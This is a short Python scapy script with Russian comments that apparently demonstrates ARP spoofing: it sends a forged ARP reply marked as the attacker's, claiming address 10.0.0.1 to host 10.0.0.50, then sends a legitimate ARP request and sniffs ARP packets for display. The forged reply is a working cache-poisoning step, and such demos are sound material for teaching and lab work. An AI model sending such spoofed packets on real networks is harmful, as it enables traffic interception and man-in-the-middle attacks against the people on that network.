from scapy.all import ARP, send, sniff, Ether

# Отправка поддельного ARP ответа (атакующий)
fake_arp_response = ARP(op=2, psrc='10.0.0.1', pdst='10.0.0.50', hwdst='ff:ff:ff:ff:ff:ff')
send(fake_arp_response)

# Отправка правильного ARP запроса (легитимный)
legit_arp_request = ARP(op=1, pdst='10.0.0.1', hwdst='ff:ff:ff:ff:ff:ff')
send(legit_arp_request)

# Функция для обработки захваченных пакетов
def arp_packet_callback(packet):
    if packet[ARP].op == 1: # Запрос
        print(f"Получен ARP запрос от {packet[ARP].psrc} к {packet[ARP].pdst}")
    elif packet[ARP].op == 2: # Ответ
        print(f"Получен ARP ответ от {packet[ARP].psrc} к {packet[ARP].pdst}")

# Захват ARP пакетов
sniff(filter="arp", prn=arp_packet_callback, count=5)
